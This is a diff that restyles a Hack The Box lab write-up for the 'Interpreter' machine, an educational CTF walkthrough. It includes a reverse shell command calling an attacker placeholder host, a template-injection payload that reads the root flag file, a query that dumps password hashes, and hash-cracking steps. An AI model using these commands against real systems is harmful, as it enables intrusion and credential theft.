@@ -1,46 +1,50 @@
-# 🖥️ HTB Writeup: Interpreter
+<div align="center">
 
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
-![Platform](https://img.shields.io/badge/Platform-Linux-blue)
-![Status](https://img.shields.io/badge/Status-Rooted-success)
+# Interpreter — HackTheBox
 
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
+
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
+
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
 
 ---
 
-## 🎯 Target Information
+</div>
 
-| Field | Value |
-|--------|--------|
-| IP Address | <Target_IP> |
-| Hostname | interpreter.htb |
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| Machine | Interpreter |
+| IP | `<Target_IP>` |
 | OS | Linux |
-| Author | Salwa-Ai |
+| Difficulty | Medium |
+| Hostname | interpreter.htb |
+
+## Table of Contents
+
+1. [Enumeration](#enumeration)
+2. [Initial Exploitation - Mirth RCE](#initial-exploitation---mirth-rce)
+3. [Reverse Shell - mirth User](#reverse-shell---mirth-user)
+4. [Credential Discovery](#credential-discovery)
+5. [Password Cracking](#password-cracking)
+6. [User Flag](#user-flag)
+7. [Privilege Escalation - Root](#privilege-escalation---root)
+8. [Flags](#flags)
+9. [Lessons Learned](#lessons-learned)
 
 ---
 
-## ⚠️ Disclaimer
+## Enumeration
 
-This writeup is for **educational purposes only** and reflects exploitation performed in an authorized Hack The Box lab environment.
-
----
-
-# 📑 Table of Contents
-
-1. [Enumeration](#-enumeration)
-2. [Initial Exploitation – Mirth RCE](#-initial-exploitation--mirth-rce)
-3. [Reverse Shell – mirth User](#-reverse-shell--mirth-user)
-4. [Credential Discovery](#-credential-discovery)
-5. [Password Cracking](#-password-cracking)
-6. [User Flag](#-user-flag)
-7. [Privilege Escalation – Root](#-privilege-escalation--root)
-8. [Final Flags](#-final-flags)
-9. [Lessons Learned](#-lessons-learned)
-
----
-
-# 🔎 Enumeration
-
-## Nmap Scan
+### Nmap Scan
 
 ```bash
 nmap -sC -sV -Pn <Target_IP>
@@ -49,20 +53,20 @@ nmap -sC -sV -Pn <Target_IP>
 ### Open Ports Identified
 
 | Port | Service | Version |
-|------|---------|----------|
+|------|---------|---------|
 | 22 | SSH | OpenSSH 9.2p1 Debian |
 | 80 | HTTP | Apache |
 | 443 | HTTPS | Apache |
 
 ---
 
-## Host Mapping
+### Host Mapping
 
 ```bash
 echo "<Target_IP> interpreter.htb" | sudo tee -a /etc/hosts
 ```
 
-Browsing the web application reveals **Mirth Connect**.
+Browsing the web application reveals Mirth Connect.
 
 Checking the API endpoint:
 
@@ -78,15 +82,13 @@ Version identified:
 
 ---
 
-# 💥 Initial Exploitation – Mirth RCE
+## Initial Exploitation - Mirth RCE
 
 Mirth Connect 4.4.0 is vulnerable to a Java deserialization RCE via its API endpoint.
 
-I used a Python exploit to trigger remote command execution.
+A Python exploit was used to trigger remote command execution.
 
----
-
-## 🧪 exploit.py
+### exploit.py
 
 ```python
 #!/usr/bin/env python3
@@ -171,9 +173,7 @@ if __name__ == "__main__":
     main()
 ```
 
----
-
-## ✅ Validate RCE
+### Validate RCE
 
 ```bash
 python3 exploit.py -u https://interpreter.htb -c 'id'
@@ -183,21 +183,21 @@ Command execution confirmed.
 
 ---
 
-# 🐚 Reverse Shell – mirth User
+## Reverse Shell - mirth User
 
-## Start Listener
+### Start Listener
 
 ```bash
 nc -lvnp 4444
 ```
 
-## Trigger Reverse Shell
+### Trigger Reverse Shell
 
 ```bash
 python3 exploit.py -u https://interpreter.htb -c 'nc -c sh <ATTACKER_IP> 4444'
 ```
 
-## Stabilize Shell
+### Stabilize Shell
 
 ```bash
 export TERM=xterm
@@ -212,7 +212,7 @@ mirth@interpreter
 
 ---
 
-# 🔐 Credential Discovery
+## Credential Discovery
 
 Mirth configuration file:
 
@@ -228,17 +228,13 @@ Pass: MirthPass123!
 DB:   mc_bdd_prod
 ```
 
----
-
-## Connect to Database
+### Connect to Database
 
 ```bash
 mysql -u mirthdb -p -h 127.0.0.1 mc_bdd_prod
 ```
 
----
-
-## Extract Username and Hash
+### Extract Username and Hash
 
 ```sql
 SELECT CONCAT(p.USERNAME, ':', pp.PASSWORD)
@@ -254,9 +250,9 @@ sedric:u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
 
 ---
 
-# 🔓 Password Cracking
+## Password Cracking
 
-## Decode Hash
+### Decode Hash
 
 ```bash
 echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256
@@ -273,9 +269,7 @@ Convert back to base64 and format as:
 sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
 ```
 
----
-
-## Crack with Hashcat
+### Crack with Hashcat
 
 ```bash
 hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
@@ -289,7 +283,7 @@ sedric:snowflake1
 
 ---
 
-# 🚀 User Flag
+## User Flag
 
 ```bash
 ssh sedric@interpreter.htb
@@ -307,15 +301,11 @@ Retrieve flag:
 cat /home/sedric/user.txt
 ```
 
-```
-<REDACTED_USER_FLAG>
-```
-
 ---
 
-# 🔥 Privilege Escalation – Root
+## Privilege Escalation - Root
 
-## Identify Local Service
+### Identify Local Service
 
 ```bash
 ps aux | grep python
@@ -333,9 +323,7 @@ Listening on:
 127.0.0.1:54321
 ```
 
----
-
-## Exploit Template Injection
+### Exploit Template Injection
 
 ```bash
 xml='<patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>a</lastname><sender_app>a</sender_app><timestamp>a</timestamp><birth_date>01/01/2000</birth_date><gender>a</gender></patient>'; printf "POST /addPatient HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/xml\r\nContent-Length: %d\r\n\r\n%s" "$(echo -n "$xml" | wc -c)" "$xml" | nc 127.0.0.1 54321
@@ -345,30 +333,36 @@ Root flag returned in response.
 
 ---
 
-# 🏁 Final Flags
+## Flags
 
-| Access | Flag |
-|--------|------|
-| User | <REDACTED_USER_FLAG> |
-| Root | <REDACTED_ROOT_FLAG> |
+| Flag | Value |
+|------|-------|
+| User | `<REDACTED>` |
+| Root | `<REDACTED>` |
 
 ---
 
-# 🎓 Lessons Learned
+## Lessons Learned
 
 - Java deserialization vulnerabilities remain highly critical.
 - Internal services bound to localhost are exploitable post-compromise.
-- Credential storage mechanisms matter — improper PBKDF2 implementation can lead to compromise.
+- Credential storage mechanisms matter -- improper PBKDF2 implementation can lead to compromise.
 - Template injection can escalate to full system compromise.
 
----
-
-# 🧠 Attack Chain Summary
+### Attack Chain Summary
 
 ```
-Mirth RCE → mirth shell → DB credentials → sedric SSH → Local template injection → root
+Mirth RCE -> mirth shell -> DB credentials -> sedric SSH -> Local template injection -> root
 ```
 
 ---
 
-**Machine successfully rooted.**
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — Interpreter*
+
+</div>
